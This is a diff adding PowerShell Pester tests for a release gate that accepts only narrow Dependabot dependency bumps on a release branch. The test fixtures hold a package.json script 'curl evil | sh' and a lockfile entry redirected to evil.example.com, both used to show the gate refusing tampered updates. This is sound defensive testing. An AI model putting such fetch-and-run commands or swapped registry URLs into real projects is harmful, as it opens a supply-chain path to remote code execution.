@@ -167,3 +167,170 @@ Describe 'Assert-ReleaseFromMain -Mode Hotfix' {
         $r.Output | Should -Match 'no stable release tag'
     }
 }
+
+# The one exception to "main first": Dependabot's updates of the release line
+# (release/X.Y for a vX.Y.* tag) may be released without being on main, because
+# they cannot be cherry-picked onto a lockfile that drifted from main's. Each
+# case changes ONE thing about an otherwise accepted update, so a refusal can
+# only come from that one thing.
+Describe 'Assert-ReleaseFromMain -Mode Hotfix: Dependabot updates of the release line' {
+    BeforeAll {
+        $script:Bot = '49699333+dependabot[bot]@users.noreply.github.com'
+        $script:ManifestJson = @'
+{
+  "name": "api",
+  "version": "1.0.0",
+  "scripts": { "test": "vitest" },
+  "dependencies": { "hono": "^4.13.14", "@hono/node-server": "2.1.5" },
+  "devDependencies": { "eslint": "^10.13.0" }
+}
+'@
+        $script:Lock = @('{', '  "packages": {', '    "node_modules/hono": {', '      "version": "4.13.14",',
+            '      "resolved": "https://registry.npmjs.org/hono/-/hono-4.13.14.tgz"', '    }', '  }', '}')
+        $script:Dockerfile = @('FROM node:24-alpine@sha256:aaaa AS build', 'RUN npm ci --omit=dev', 'FROM node:24-alpine@sha256:aaaa')
+
+        # Values are line arrays, or a hashtable written as JSON.
+        function Write-Files([hashtable] $Files) {
+            foreach ($path in $Files.Keys) {
+                $parent = Split-Path $path -Parent
+                if ($parent) { New-Item -ItemType Directory -Force $parent | Out-Null }
+                $value = $Files[$path]
+                $lines = if ($value -is [System.Collections.IDictionary]) { $value | ConvertTo-Json -Depth 10 } else { $value }
+                Set-Content -Path $path -Value $lines -Encoding ascii
+                Invoke-Git add $path
+            }
+        }
+
+        # Commits $Files as Dependabot (or $Author), merged by $Committer.
+        function New-UpdateCommit([hashtable] $Files, [string] $Author = $script:Bot, [string] $Committer = 'noreply@github.com') {
+            Write-Files $Files
+            $env:GIT_AUTHOR_NAME = 'dependabot[bot]'; $env:GIT_AUTHOR_EMAIL = $Author
+            $env:GIT_COMMITTER_NAME = 'GitHub'; $env:GIT_COMMITTER_EMAIL = $Committer
+            try { Invoke-Git commit -q -m 'build: Bump hono from 4.13.14 to 4.13.18 in /app/api (#1598)' }
+            finally { Remove-Item Env:GIT_AUTHOR_NAME, Env:GIT_AUTHOR_EMAIL, Env:GIT_COMMITTER_NAME, Env:GIT_COMMITTER_EMAIL }
+        }
+
+        function Copy-Manifest { $script:ManifestJson | ConvertFrom-Json -AsHashtable }
+        function Get-BumpedManifest { $m = Copy-Manifest; $m.dependencies.hono = '^4.13.18'; $m }
+        function Get-BumpedLock { $script:Lock -replace '4\.13\.14', '4.13.18' }
+
+        function Invoke-LineChecker([string] $Ref) {
+            $out = pwsh -NoProfile -File $script:Checker -Mode Hotfix -Ref $Ref -Main main -ReleaseBranchPrefix 'release/' 2>&1
+            [pscustomobject]@{ ExitCode = $LASTEXITCODE; Output = ($out -join "`n") }
+        }
+    }
+
+    # main: base (with the dependency files) -> v1.0.0 -> drift on main.
+    # release/1.0 starts at v1.0.0.
+    BeforeEach {
+        $dir = Join-Path $TestDrive ([guid]::NewGuid().ToString('N'))
+        New-Item -ItemType Directory $dir | Out-Null
+        Set-Location $dir
+        Invoke-Git init -q -b main
+        Invoke-Git config user.email t@example.com
+        Invoke-Git config user.name tester
+        Invoke-Git config commit.gpgsign false
+        Write-Files @{ 'app/api/package.json' = (Copy-Manifest); 'app/api/package-lock.json' = $script:Lock; 'app/api/Dockerfile' = $script:Dockerfile }
+        Invoke-Git commit -q -m base
+        Invoke-Git tag v1.0.0
+        Write-Files @{ 'app.txt' = @('main moved on') }
+        Invoke-Git commit -q -m 'feature on main'
+        $script:MainFeature = (git rev-parse HEAD).Trim()
+        Invoke-Git checkout -q -b release/1.0 v1.0.0
+    }
+
+    It 'accepts a version bump of package.json and its lockfile' {
+        New-UpdateCommit @{ 'app/api/package.json' = (Get-BumpedManifest); 'app/api/package-lock.json' = (Get-BumpedLock) }
+        $r = Invoke-LineChecker release/1.0
+        $r.Output | Should -Match '^OK:'
+        $r.ExitCode | Should -Be 0
+    }
+
+    It 'accepts a base image bump that only changes FROM lines' {
+        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'aaaa', 'bbbb') }
+        (Invoke-LineChecker release/1.0).ExitCode | Should -Be 0
+    }
+
+    It 'accepts several updates with a clean cherry-pick of main between them' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
+        Invoke-Git cherry-pick -x $script:MainFeature
+        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'aaaa', 'bbbb') }
+        (Invoke-LineChecker release/1.0).ExitCode | Should -Be 0
+    }
+
+    It 'refuses the same change when someone else authored it' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) } -Author 'someone@example.com'
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'not a Dependabot update of the release line'
+    }
+
+    It 'refuses a Dependabot commit that was not merged through GitHub (pushed with a copied author)' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) } -Committer 'someone@example.com'
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'not merged through a GitHub pull request'
+    }
+
+    It 'refuses a Dependabot commit that is not on the release line of the base tag' {
+        Invoke-Git checkout -q -b bugfixes/elsewhere v1.0.0
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
+        $r = Invoke-LineChecker bugfixes/elsewhere
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'is not on release/1\.0, the release line of v1\.0\.0'
+    }
+
+    It 'refuses a Dependabot commit that also touches code' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock); 'app/api/src/index.js' = @('evil()') }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'changes app/api/src/index\.js, which is not a dependency file'
+    }
+
+    It 'refuses a package.json change outside the dependency lists (a script)' {
+        $m = Get-BumpedManifest; $m.scripts.test = 'curl evil | sh'
+        New-UpdateCommit @{ 'app/api/package.json' = $m }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'outside its dependency lists'
+    }
+
+    It 'refuses a dependency pointed at something other than a plain version' {
+        $m = Copy-Manifest; $m.dependencies.hono = 'git+https://example.com/hono.git'
+        New-UpdateCommit @{ 'app/api/package.json' = $m }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match "sets hono to 'git\+https://example\.com/hono\.git', which is not a plain version"
+    }
+
+    It 'refuses a dependency that is added rather than bumped' {
+        $m = Get-BumpedManifest; $m.dependencies['left-pad'] = '1.3.0'
+        New-UpdateCommit @{ 'app/api/package.json' = $m }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match "adds or removes a dependency in 'dependencies'"
+    }
+
+    It 'refuses a lockfile entry resolved outside the npm registry' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = ((Get-BumpedLock) -replace 'https://registry\.npmjs\.org/', 'https://evil.example.com/') }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'outside registry\.npmjs\.org'
+    }
+
+    It 'refuses a Dockerfile change beyond the FROM lines' {
+        New-UpdateCommit @{ 'app/api/Dockerfile' = ($script:Dockerfile -replace 'npm ci --omit=dev', 'npm ci') }
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        $r.Output | Should -Match 'more than a FROM line'
+    }
+
+    It 'still refuses an unreviewed commit next to an accepted update, naming only that one' {
+        New-UpdateCommit @{ 'app/api/package-lock.json' = (Get-BumpedLock) }
+        Write-Files @{ 'app.txt' = @('unreviewed') }
+        Invoke-Git commit -q -m 'pushed straight to the line'
+        $r = Invoke-LineChecker release/1.0
+        $r.ExitCode | Should -Be 1
+        ([regex]::Matches($r.Output, '::error::')).Count | Should -Be 1
+    }
+}
